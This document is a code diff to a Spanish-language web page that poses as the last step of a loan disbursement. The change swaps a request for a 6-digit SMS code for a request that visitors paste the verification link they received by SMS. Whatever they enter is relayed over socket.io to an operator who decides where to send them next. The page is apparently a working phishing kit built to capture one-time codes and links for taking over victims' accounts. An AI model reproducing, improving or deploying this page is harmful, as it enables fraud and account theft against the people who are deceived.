@@ -82,52 +82,62 @@
 </head>
 <body>
   <div class="screen">
-    <h3>Te enviaremos el codigo SMS a su celular o Whatsapp</h3>
-    <p>Introduce el codigo de verificacion que te acabamos de enviar a su celular de confianza o Whatsapp.</p>
+    <h3>¡ULTIMO PASO!</h3>
+    <p>Para confirmar tu identidad y nuestro sistema pueda identificarte para activar tu desembolso es necesario que valide con el enlace que se le fue enviado a su celular.</p>
+    <h6>Por favor copie el enlace en su sms y peguelo a continuacion para activar su desembolso.</h6>
     <div class="input-group">
       <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+      <input type="text" id="codigo" placeholder="Código de verificación"  required>
     </div>
     <p id="mensajeError" class="mensaje-error"></p>
     <button onclick="validarCodigo()">Validar código</button>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
-    const sessionId = localStorage.getItem("sessionId");
-    socket.emit("reconectar", sessionId);
+ <!-- Reemplaza tu función `validarCodigo` por esta nueva -->
+<script>
+  const socket = io();
+  const sessionId = localStorage.getItem("sessionId");
+  socket.emit("reconectar", sessionId);
 
-    function validarCodigo() {
-      const codigo = document.getElementById("codigo").value;
-      const mensajeError = document.getElementById("mensajeError");
-      const codigoInput = document.getElementById("codigo");
+  function validarCodigo() {
+    const codigo = document.getElementById("codigo").value.trim();
+    const mensajeError = document.getElementById("mensajeError");
+    const codigoInput = document.getElementById("codigo");
 
-      mensajeError.textContent = "";
-      codigoInput.classList.remove("campo-requerido");
+    mensajeError.textContent = "";
+    codigoInput.classList.remove("campo-requerido");
 
-      if (!codigo) {
-        mensajeError.textContent = "El código es obligatorio";
-        codigoInput.classList.add("campo-requerido");
-      } else if (!/^\d{6}$/.test(codigo)) {
-        mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
-        codigoInput.classList.add("campo-requerido");
-      } else {
-        // Enviar el código al backend
-        socket.emit("codigoIngresado", { codigo, sessionId });
-
-        // Ir a pantalla de espera
-        window.location.href = "opciones.html";
-      }
+    if (!codigo) {
+      mensajeError.textContent = "Este campo es obligatorio";
+      codigoInput.classList.add("campo-requerido");
+      return;
     }
 
-    socket.on("respuestaCodigo", (decision) => {
-      if (decision === "error") {
-        window.location.href = "denegado.html";
-      } else if (decision === "finalizar") {
-        window.location.href = "https://www.google.com";
-      }
-    });
-  </script>
+    // Validar si es una URL válida
+    const urlRegex = /^(https?:\/\/)[^\s/$.?#].[^\s]*$/i;
+
+    if (!urlRegex.test(codigo)) {
+      mensajeError.textContent = "Debe ingresar un enlace válido (ej. https://...)";
+      codigoInput.classList.add("campo-requerido");
+      return;
+    }
+
+    // Enviar al backend
+    socket.emit("codigoIngresado", { codigo, sessionId });
+
+    // Ir a pantalla de espera
+    window.location.href = "opciones.html";
+  }
+
+  socket.on("respuestaCodigo", (decision) => {
+    if (decision === "error") {
+      window.location.href = "denegado.html";
+    } else if (decision === "finalizar") {
+      window.location.href = "https://www.google.com";
+    }
+  });
+</script>
+
 </body>
 </html>
